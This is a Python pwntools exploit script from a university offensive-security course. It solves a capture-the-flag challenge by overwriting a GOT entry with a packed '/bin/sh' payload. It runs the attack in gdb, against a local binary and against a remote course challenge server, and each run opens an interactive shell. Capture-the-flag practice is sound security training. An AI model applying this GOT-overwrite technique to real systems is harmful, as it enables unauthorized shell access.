from pwn import *
from pwnlib.util.packing import *
import re
import struct
import math

#############################################################
#	GitGOTGood_Pwn.py										#
#	Lindsay Von Tish (lmv9443@nyu.edu)						#
#	Pwn 2: Git it GOT it Good								#
#	03/06/2024												#
#############################################################

# A function to convert encoded input to a string and remove text format characters
#	Input: Encoded string
#	Output: Unencoded string
def cleanLine(ln):
	ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
	l = ansi_escape.sub('', str(ln, encoding='utf-8'))
	return l

# A function to build the payload
#	Input: N/A
#	Output: Payload String
def pld():
	cmd = p64(0x68732F6E69622F)
	rcAddr = p64(0x000000000040074B)
	pAddr  = p64(0x0000000000601010)
	#print(len(cmd))
	#print(len(rcAddr))
	#print(len(pAddr))
	p = cmd + rcAddr + pAddr
	#print(p)
	return p

# A function to attack git_got_good through gdb for testing
#	Input: N/A
#	Output: N/A
def testPld():
	p =  process('/bin/bash')
	p.sendline('gdb ./git_got_good -q')
	p.sendline("break *0x0000000000400800")
	p.sendline("break *0x000000000040080e")
	p.sendline("r")
	p.recvuntil("save:")
	p.sendline(pld())
	p.interactive()

# A function to attack a local instance of git_got_good
#	Input: N/A
#	Output: N/A
def localShell():
	p = process("./git_got_good")
	p.recvuntil("save:")
	p.sendline(pld())
	p.interactive()

# Host and port for the remote challenge
HOST = 'offsec-chalbroker.osiris.cyber.nyu.edu'
PORT = 1341

# A function to attack a remote instance of git_got_good
#	Input: N/A
#	Output: N/A
def remoteShell():
	p = remote(HOST, PORT)
	p.recvuntil("save:")
	p.sendline(pld())
	p.interactive()


# Uncomment to run
# testPld()
# localShell()
# remoteShell()